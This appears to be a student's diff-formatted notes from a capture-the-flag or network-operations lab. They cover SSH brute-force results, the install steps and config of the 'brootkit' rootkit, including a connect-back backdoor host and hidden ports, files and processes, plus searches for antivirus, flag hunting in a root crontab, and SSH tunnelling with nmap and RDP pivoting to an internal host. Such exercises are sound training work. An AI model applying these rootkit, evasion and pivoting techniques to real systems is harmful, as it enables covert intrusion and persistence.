+      Thread[ 1]      wzt@192.168.215.148             ==>     [e               ]      [failed]         3
+      Thread[ 2]      wzt@192.168.215.148             ==>     [a               ]      [failed]         3
+      Thread[ 3]      wzt@192.168.215.148             ==>     [d               ]      [failed]         3
+      Thread[ 4]      wzt@192.168.215.148             ==>     [123456789       ]      [success]        6
+      Thread[ 5]      wzt@192.168.215.148             ==>     [123456          ]      [failed]         3
+      Thread[ 6]      wzt@192.168.215.148             ==>     [fd              ]      [failed]         3
+
+      waiting all threads to finsh...
+
+    Freebsd system
+    on the modern freebsd system root use csh by default, the other users
+    use sh default. this version of brootkit can only support sh based features.
+
+    1. edit brsh.conf first
+
+    brshootkit config file, only one argument support.
+
+      #this port will be hidden.
+      HIDE_PORT               8080
+      #these files will be hidden.
+      HIDE_FILE               brsh
+      #these process will be hidden.
+      HIDE_PROC               sh
+      #the connect back host domain name or ip address.
+      REMOTE_HOST             localhost
+      #the connect back host port.
+      REMOTE_PORT             8080
+      #the connect backdoor base sleep time.
+      SLEEP_TIME              60
+
+    2. ./install.sh
+
+######SOURCE
+    https://github.com/cloudsec/brootkit
+
+look at the config file it specifies in README
+sudo cat /root/brootkit/brootkit-master/br.conf
+#brootkit config file.
+#
+HIDE_PORT		8080,8899
+HIDE_FILE		br.conf,bashbd.sh,brootkit,.bdrc,brdaemon,wzt
+HIDE_PROC		bashbd,brootkit,pty.spawn,brdaemon
+REMOTE_HOST		192.168.215.128
+REMOTE_PORT		8080
+SLEEP_TIME		60
+
+#f1@G = pnL71XvpJ6fypOG4E6Ty
+
+
+find antivirus
+find / -iname *rkhunter* 2>/dev/null
+
+/etc/default/rkhunter
+/etc/rkhunter.conf
+/etc/cron.weekly/rkhunter
+/etc/apt/apt.conf.d/90rkhunter
+/etc/cron.daily/rkhunter
+/etc/logrotate.d/rkhunter
+/etc/logcheck/ignore.d.server/rkhunter
+/var/cache/apt/archives/rkhunter_1.4.6-2~ubuntu18.04.1_all.deb
+/var/log/rkhunter.log.1
+/var/log/rkhunter.log
+/var/lib/dpkg/triggers/rkhunter-propupd
+/var/lib/dpkg/info/rkhunter.md5sums
+/var/lib/dpkg/info/rkhunter.triggers
+/var/lib/dpkg/info/rkhunter.conffiles
+/var/lib/dpkg/info/rkhunter.postinst
+/var/lib/dpkg/info/rkhunter.list
+/var/lib/dpkg/info/rkhunter.config
+/var/lib/dpkg/info/rkhunter.postrm
+/var/lib/dpkg/info/rkhunter.templates
+/var/lib/ucf/cache/:etc:default:rkhunter
+/var/lib/rkhunter
+/var/lib/rkhunter/db/rkhunter_prop_list.dat
+/var/lib/rkhunter/db/rkhunter.dat
+/usr/share/doc/rkhunter
+/usr/share/rkhunter
+/usr/share/man/man8/rkhunter.8.gz
+/usr/bin/rkhunter
+
+
+find / -iname *comodo* 2>/dev/null
+
+/etc/ssl/certs/Comodo_AAA_Services_root.pem
+/etc/ssl/certs/COMODO_ECC_Certification_Authority.pem
+/etc/ssl/certs/COMODO_Certification_Authority.pem
+/etc/ssl/certs/COMODO_RSA_Certification_Authority.pem
+/usr/share/ca-certificates/mozilla/Comodo_AAA_Services_root.crt
+/usr/share/ca-certificates/mozilla/COMODO_Certification_Authority.crt
+/usr/share/ca-certificates/mozilla/COMODO_ECC_Certification_Authority.crt
+/usr/share/ca-certificates/mozilla/COMODO_RSA_Certification_Authority.crt
+
+cat all files to find flag
+cat /etc/rkhunter.conf
+
+............
+#Fl@G = IRJf3PqRz2Jzt2hlm5z4
+
+sudo /var/spool/cron/crontabs
+total 12
+68381 4 drwx-wx--T 2 root crontab 4096 May  4  2023 .
+68380 4 drwxr-xr-x 5 root root    4096 Mar  4  2020 ..
+ 4631 4 -rw------- 1 root root      83 Jul  9 19:40 root
+
+sudo cat /var/spool/cron/crontabs/root
+*/15 * * * *    /bin/bash echo '#Fl@g = 5Qm7XM2wxUpuAlWyPhdm' >> /var/log/auth.log
+
+
+make new master socket to .253
+ssh -MS /tmp/T2 comrade@127.0.0.1 -p 11715
+
+
+move dynamic to T1
+nmap .28.9
+proxychains nmap 192.168.28.9 -T5 --script=http-enum -p 1-65535
+
+Nmap scan report for 192.168.28.9
+Host is up (0.00059s latency).
+Not shown: 9993 closed ports
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+5040/tcp open  unknown
+5985/tcp open  wsman  ------- http
+5986/tcp open  wsmans
+47001/tcp open  winrm ---------http
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+49671/tcp open  unknown
+
+
+make sockets to found http port
+ssh -S /tmp/T1 dummy -O forward -L 11716:192.168.28.9:5985 -L 11717:192.168.28.9:47001 -L 11718:192.168.28.9:3389
+
+make rdp session with 28.9
+
+xfreerdp /u:comrade /v:127.0.0.1:11718 /dynamic-resolution /glyph-cache /clipboard
 
 
